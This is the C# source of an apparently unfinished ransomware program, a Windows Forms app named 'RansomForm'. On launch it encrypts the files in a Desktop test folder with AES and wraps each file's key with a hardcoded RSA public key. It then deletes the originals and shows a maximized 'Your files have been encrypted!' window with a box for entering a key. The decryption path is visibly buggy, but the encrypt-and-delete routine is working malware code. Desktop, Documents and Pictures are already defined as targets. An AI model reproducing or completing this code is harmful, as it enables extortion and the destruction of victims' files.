using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;

namespace RansomForm
{
    public partial class Form1 : Form
    {

        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        private static int encryptedFileCount = 0;
        private static int decryptedFileCount = 0;

        //private static string RSA_PUBLIC_KEY = @"<Modulus>xyRrcgJi7q0Ki5V3J0IgJodvVIYiklGQMTarSURo39FvshxptBlAKMzZXjG30abm/HMHXblSII9S3G2uFrCbzIR3Fv4Jjj9lYGFLGRXmTvw6Bd8rty/ZKmurgdvPtkJBU6euSTFxbyfU68tx+qsmkA5NJA2Hcr03rCIju+X0Gd0=</Modulus><Exponent>AQAB</Exponent>";
        private static string Public_Key = "<RSAKeyValue><Modulus>tgvaHp0xZvYxtfWWVuXyVLbzsEuM8rKzeSwxY/0Cypt0Y9bQjRd4cEKRP+tulC0xecHiHkz/opRCY7CAqQOsXukzSshDhWNG34pjGODpH/EL5annzK8RanKq1R2y3pWl7ZSWjvMB7qes/Bu20Dtug4OB3dQHAl9WwPQnjPPZsPU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"; // RSA

        private const string ENCRYPTED_FILE_EXTENSION = ".encrypted";

        private static string ENCRYPTION_LOG = "";
        private static string DECRYPTION_LOG = "";

        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
        private const bool DELETE_ENCRYPTED_FILE = true;


        private static byte[] STATIC_IV;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //string randomPassword = Convert.ToBase64String(GenerateRandomSalt(32)); // Random AES Password
            //string passwordEncrypted = encryptAESKey(randomPassword); // Encrypt the AES Password

            encryptFolder(DESKTOP_FOLDER + "\\testfiles"); // Encrypt File using Encrypted AES password + another generated salt
            formatFormPostEncryption();

            // Just Thinking:
            // To decrypt the aes password from a file with rsa privatekey, how do i know its the right aes password? (and dont use the 
            // wrong one to decrypt) ---> Check if aes password is a number? (So make my aes password only numbers)
        }

        private static byte[] encryptAESKey(byte[] passwordBytes) // This is the AES password
        {
            string pubKey = Public_Key; // RSA PKey
            //byte[] bytes = Encoding.UTF8.GetBytes(password);
            byte[] inArray;
            //string encryptedPassword;

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            try
            {
                rsa.FromXmlString(pubKey);
                inArray = rsa.Encrypt(passwordBytes, false); //Using the RSA pkey, encrypt the AES password
                //encryptedPassword = Convert.ToBase64String(inArray);
            }
            finally
            {
                rsa.PersistKeyInCsp = false;
            }

            return inArray;
        }

        private static bool fileIsEncrypted(string inputFile)
        {
            if (inputFile.Contains(ENCRYPTED_FILE_EXTENSION))
                if (inputFile.Substring(inputFile.Length - ENCRYPTED_FILE_EXTENSION.Length, ENCRYPTED_FILE_EXTENSION.Length) == ENCRYPTED_FILE_EXTENSION)
                    return true;
            return false;
        }

        private void encryptFolder(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Encrypting: " + f);
                        fileEncrypt(f);
                    }
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private void decryptFolder(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    if (f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Console.Out.WriteLine("Decrypting: " + f);
                        fileDecrypt(f);
                    }
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        private static void fileEncrypt(string inputFile)
        {
            byte[] randPassword = Encoding.UTF8.GetBytes("Allo Je suis laAllo Je suis laaa");//GenerateRandomSalt(32); //Password for each file that will get encrypted with RSA
            int num = 0;
            int num3 = 0;

            FileStream fs = new FileStream(inputFile, FileMode.Open); // New encrypted file  + ENCRYPTED_FILE_EXTENSION
            FileStream newfs = new FileStream(inputFile+".encrypted", FileMode.CreateNew);

            // File buffer size thing
            long num2 = fs.Length / 1048576L;
            num2 = num2 * 30L / 100L;
            while ((long)num3 < num2)
            {
                num += 1048576;
                num3++;
            }
            if (num == 0)
            {
                num = Convert.ToInt32(fs.Length);
            }

            fs.Seek(0L, SeekOrigin.Begin);
            byte[] salt = GenerateRandomSalt(32);
            byte[] encryptedRandPassword = encryptAESKey(randPassword); // Encrypted AES Key for the file.
            int i;
            byte[] line = new byte[1048576];
            byte[] encryptedLine;

            for (i = 0; i < num; i+= encryptedLine.Length)
            {
                int len = fs.Read(line, 0, line.Length);
                encryptedLine = AESEncrypt(line, randPassword, salt, len);
                newfs.Seek((long)i, SeekOrigin.Begin);
                newfs.Write(encryptedLine, 0, encryptedLine.Length); // Write the encrypted lines to the new file
            }
            // Write Salt, Encrypted AES Password
            newfs.Seek(newfs.Length, SeekOrigin.Begin);
            newfs.Write(salt, 0, salt.Length); // Write Salt at the end of the file
            newfs.Seek(newfs.Length, SeekOrigin.Begin);
            newfs.Write(encryptedRandPassword, 0, encryptedRandPassword.Length); // Write Encrypted Password for AES at the end of the file
            //BinaryWriter bw = new BinaryWriter(newfs); //wtf is this for?
            //bw.Write(i);

            /*byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);

            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CBC;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);


            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
            */
            ENCRYPTION_LOG += inputFile + "\n";
            encryptedFileCount++;
            fs.Close();
            newfs.Close();
            if (DELETE_ALL_ORIGINALS)
            {
                File.Delete(inputFile);
            }
        }

        public static byte[] AESEncrypt(byte[] buffer, byte[] randPassword, byte[] salt, int len)
        {
            byte[] array = null;
            MemoryStream ms = new MemoryStream();
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            Rfc2898DeriveBytes rfc = new Rfc2898DeriveBytes(randPassword, salt, 100);
            aes.Key = rfc.GetBytes(aes.KeySize / 8);
            aes.GenerateIV(); // CHeck if created aes.IV = ????
            STATIC_IV = aes.IV;
            aes.Mode = CipherMode.CBC;
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(buffer, 0, len);
            byte[] array2 = ms.ToArray();
            array = new byte[array2.Length + aes.IV.Length];
            aes.IV.CopyTo(array, 0);
            array2.CopyTo(array, aes.IV.Length);
            return array;
        }

        public static byte[] AESDecrypt(byte[] encryptedLine, byte[] password, byte[] salt, int len)
        {
            string passwordString = Convert.ToBase64String(password); //Does it convert it to the right stringtype ???
            byte[] decryptedLine = null;

            MemoryStream ms = new MemoryStream();
            AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            Rfc2898DeriveBytes rfc = new Rfc2898DeriveBytes(passwordString, salt);
            aes.Key = rfc.GetBytes(aes.KeySize / 8);
            aes.IV = STATIC_IV; // Is this the same then when creating it????
            aes.Mode = CipherMode.CBC;
            CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(encryptedLine, 0, len);
            byte[] array2 = ms.ToArray();
            decryptedLine = new byte[array2.Length + aes.IV.Length];
            aes.IV.CopyTo(decryptedLine, 0);
            array2.CopyTo(decryptedLine, aes.IV.Length);

            return decryptedLine;
        }

        private void fileDecrypt(string inputFile)
        {
            //byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] encryptedPassword = new byte[128];
            //byte[] privateKey = Encoding.UTF8.GetBytes(textKeyEnter.Text);
            byte[] password;
            FileStream fs = new FileStream(inputFile, FileMode.Open); // already .encrypted
            string outputfile = fs.Name.Replace(".encrypted", "");
            fs.Seek(fs.Length - 128, SeekOrigin.Begin);
            fs.Read(encryptedPassword, 0, encryptedPassword.Length); // Read the RSA-Encrypted AES key

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            try
            {
                rsa.FromXmlString(textKeyEnter.Text);
                //rsa.ImportRSAPrivateKey(privateKey, out len);
                password = rsa.Decrypt(encryptedPassword, false);
                //string passString = System.Text.ASCIIEncoding.ASCII.GetString(password); // !!! Il faut utiliser ce convert et pas l'autre sinon ne marche pas !!!
                //Garder password en bytes
            }
            finally
            {
                rsa.PersistKeyInCsp = false;
            }


            // Decryption commence ici !
            // Decryption semble ne pas fonctionner a partir d'ici puisqu'on obtient bien le aes password décrypté.

            //byte[] randPassword = password
            int num = 0;
            int num3 = 0;

            //FileStream fs = new FileStream(inputFile, FileMode.Open); // New encrypted file  + ENCRYPTED_FILE_EXTENSION
            FileStream newfs = new FileStream(outputfile, FileMode.CreateNew);

            // File buffer size thing
            long num2 = (fs.Length-64) / 1048576L; // 64 = AES Password + RandSalt
            num2 = num2 * 30L / 100L;
            while ((long)num3 < num2)
            {
                num += 1048576;
                num3++;
            }
            if (num == 0)
            {
                num = Convert.ToInt32(fs.Length);
            }


            byte[] salt = new byte[32];
            fs.Seek(fs.Length-64, SeekOrigin.Begin); // 64 = AES Password + RandSalt
            fs.Read(salt, 0, 32);
            //byte[] encryptedRandPassword = encryptAESKey(randPassword); // Encrypted AES Key for the file.
            int i;
            byte[] encryptedLine = new byte[1048576];
            byte[] decryptedLine;
            fs.Seek(0L, SeekOrigin.Begin);

            for (i = 0; i < num; i += decryptedLine.Length)
            {
                int len = fs.Read(encryptedLine, 0, encryptedLine.Length);
                decryptedLine = AESDecrypt(encryptedLine, password, salt, len);
                newfs.Seek((long)i, SeekOrigin.Begin);
                newfs.Write(decryptedLine, 0, decryptedLine.Length); // Write the encrypted lines to the new file
            }
            // Write Salt, Encrypted AES Password
            //newfs.Seek(newfs.Length, SeekOrigin.Begin);
            //newfs.Write(salt, 0, salt.Length); // Write Salt at the end of the file
            //newfs.Seek(newfs.Length, SeekOrigin.Begin);
            //newfs.Write(encryptedRandPassword, 0, encryptedRandPassword.Length);

            /*fsCrypt.Read(salt, 0, salt.Length);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            //var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            //FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    //Application.DoEvents();
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                fsCrypt.Close();
                if (DELETE_ENCRYPTED_FILE)
                    File.Delete(inputFile);
                DECRYPTION_LOG += inputFile + "\n";
                decryptedFileCount++;
            }
        }*/
        }
        private void formatFormPostEncryption()
        {
            this.Opacity = 100;
            this.WindowState = FormWindowState.Maximized;
            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
            encryptedFileslbl.Text = ENCRYPTION_LOG;
        }

        public static byte[] GenerateRandomSalt(int size)
        {
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            byte[] data = new byte[size];

            // Fille the buffer with the generated data
            rng.GetBytes(data);
            //return Convert.ToBase64String(data);

            return data;
        }

        private void buttonDecrypt_Click(object sender, EventArgs e)
        {
            decryptFolder(DESKTOP_FOLDER + "\\testfiles");
        }
    }
}